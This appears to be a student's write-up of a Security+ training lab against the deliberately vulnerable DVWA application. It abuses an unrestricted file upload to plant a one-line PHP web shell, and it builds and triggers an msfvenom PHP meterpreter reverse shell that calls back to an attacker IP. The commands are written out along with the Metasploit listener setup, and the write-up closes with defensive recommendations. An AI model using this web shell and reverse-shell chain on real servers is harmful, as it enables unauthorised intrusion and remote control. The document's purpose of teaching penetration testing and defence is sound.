# Lab: File Upload Exploitation & Web Shell / Reverse Shell

**Source:** CompTIA Security+ CertMaster Labs (Section 15.3.5 — Performing Penetration Testing)
**Environment:** DVWA (Damn Vulnerable Web Application) on Kali Linux
**Techniques:** Malicious File Upload → PHP Command Shell → Reverse Shell via Metasploit
**OWASP Category:** A04 — Insecure Design / A08 — Software and Data Integrity Failures
**Status:** ✅ Complete

---

## Scenario

Building on the command injection lab, the target web application was found to have an unrestricted file upload function. The objective was to exploit this vulnerability in two stages: first by uploading a PHP command shell to achieve remote code execution (RCE), then by using msfvenom and Metasploit to establish a full interactive reverse shell connection.

---

## Part 1 — File Upload Vulnerability Discovery & PHP Command Shell

### What is a File Upload Vulnerability?

When a web application allows file uploads without validating file type or content, an attacker can upload executable code (such as a PHP script) disguised as a legitimate file. If the server executes uploaded files, this results in Remote Code Execution — the attacker can run arbitrary commands on the server through a browser URL.

---

### Step 1 — Confirming the Upload Vulnerability

Copied a legitimate image file to the working directory:
```bash
cp /usr/share/xsser/gtk/images/world.png world.png
```

Uploaded `world.png` via the DVWA File Upload page. Result:
```
../../hackable/uploads/world.png successfully uploaded
```

Accessed the file via URL:
```
http://dvwa.structureality.com/vulnerabilities/upload/../../hackable/uploads/world.png
```
Result: World map image displayed — **file upload and direct URL access confirmed.**

---

### Step 2 — Creating a PHP Command Shell

Created a minimal PHP web shell (`special.php`) using vim:

```php
<&## 63;php system&## 40;&## 36;&## 95;REQUEST&## 91;&## 34;cmd&## 34;&## 93;&## 41;&## 59; &## 63;>
```

This script accepts a `cmd` parameter from the URL and passes it directly to the system shell — effectively turning any browser request into a command line.

Uploaded `special.php` via the file upload page. Result:
```
../../hackable/uploads/special.php successfully uploaded
```

---

### Step 3 — Executing Commands via the Web Shell

**Initial test — listing files in upload directory:**
```
http://dvwa.structureality.com/hackable/uploads/special.php?cmd=ls
```
Result: `dvwa_email.png`, `special.php`, `world.png` — upload directory contents confirmed.

**Enumerating the target system through the shell:**

| URL Parameter | Command | Result |
|--------------|---------|--------|
| `?cmd=ls+..` | Parent directory listing | Web root structure |
| `?cmd=whoami` | User context | `www-data` |
| `?cmd=hostname` | System hostname | Target machine name |
| `?cmd=ip+a` | Network interfaces | IP configuration |
| `?cmd=cat+/etc/passwd` | User accounts | Full `/etc/passwd` contents |

> Note: `+` is used in URLs to represent a space character.

**Impact at this stage:** Full remote code execution as `www-data` through a browser — no credentials, no exploit code, just an unvalidated file upload and a four-line PHP script.

---

## Part 2 — Establishing a Reverse Shell

### What is a Reverse Shell?

A reverse shell inverts the normal connection direction. Instead of the attacker connecting to the target (which firewalls typically block), the target connects outbound to the attacker's machine. This bypasses ingress filtering and is much harder to detect at the network perimeter.

A **web shell** executes commands through HTTP requests. A **reverse shell** establishes a persistent interactive session — closer to having a real terminal on the target machine.

---

### Step 1 — Generating the Payload with msfvenom

Used msfvenom to generate a PHP reverse shell payload:

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.16.66 LPORT=9999 -f raw > shell.php
```

**Parameter breakdown:**
- `-p php/meterpreter_reverse_tcp` — PHP payload that calls back over TCP
- `LHOST=10.1.16.66` — attacker's IP address (the machine to connect back to)
- `LPORT=9999` — port the attacker will be listening on
- `-f raw` — output as raw PHP file
- `> shell.php` — save as shell.php

Output confirmed: `Payload size: 34049 bytes`

([Penetration-Testing/4.jpg](https://github.com/TheoMcCoy/cybersecurity-lab/blob/0398f0bf731bbcfb7853afc82aab34d42c4ead54/Penetration-Testing/4.jpg)
---

### Step 2 — Configuring Metasploit Listener

Launched Metasploit and configured a multi/handler to receive the incoming connection:

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 10.1.16.66
set LPORT 9999
show options   # verify settings
run            # start listener
```

Metasploit now waiting for the target to connect back.

---

### Step 3 — Uploading and Triggering the Shell

Uploaded `shell.php` via DVWA File Upload page. Result:
```
../../hackable/uploads/shell.php successfully uploaded
```

Navigated to the shell URL in Firefox:
```
http://dvwa.structureality.com/hackable/uploads/shell.php
```

Result in Metasploit terminal:
```
Meterpreter session 1 opened
meterpreter >
```

**Reverse shell connection established.**

---

### Step 4 — Post-Exploitation Enumeration

From the Meterpreter session:

```bash
sysinfo     # System details — OS, hostname, architecture
getuid      # User account context running the shell
help        # Full list of available Meterpreter commands
```

---

## Full Attack Chain Summary

```
Unrestricted File Upload
        ↓
PHP Command Shell Uploaded (special.php)
        ↓
Remote Code Execution via URL (?cmd=whoami)
        ↓
msfvenom Payload Generated (shell.php)
        ↓
Metasploit Listener Started
        ↓
Payload Uploaded via File Upload Vulnerability
        ↓
Reverse Shell Triggered via Browser
        ↓
Meterpreter Session Opened — Interactive OS Access
```

---

## Impact Assessment

Starting from a single unrestricted file upload field, this attack chain achieved:
- Full remote code execution on the web server
- Interactive reverse shell session as `www-data`
- Complete file system read access within user permissions
- Platform for further privilege escalation, lateral movement, or persistence

The web application required no authentication bypass — the file upload function was accessible to any user.

---

## Defensive Recommendations

| Control | Layer | Description |
|---------|-------|-------------|
| File type validation | Application | Allowlist permitted extensions (`.jpg`, `.png` only) — reject `.php`, `.sh`, etc. |
| Content inspection | Application | Validate file contents match declared type — not just extension |
| Rename uploaded files | Application | Strip original filename and extension on upload — store with random name |
| Separate upload storage | Infrastructure | Store uploads on a non-executable file system or object storage (e.g. S3) |
| Disable PHP execution in upload directory | Server | Configure web server to serve files in upload directories as static only |
| Egress filtering | Network | Block unexpected outbound connections — would have prevented the reverse shell callback |
| EDR / file integrity monitoring | Endpoint | Alert on new PHP files appearing in web-accessible directories |

---

## Key Takeaway

This lab chain illustrates how a single misconfiguration — an unrestricted file upload — can be escalated from initial access all the way to an interactive shell session. Each step built on the last: file upload → RCE → reverse shell. The most impactful defensive control at the network level would have been **egress filtering**: even with RCE achieved, the reverse shell callback to the attacker's machine would have been blocked, containing the breach to read-only command execution rather than an interactive session.

---


*Write-up by Lereko Mohlomi | [LinkedIn](https://www.linkedin.com/in/lereko-mohlomi/)*

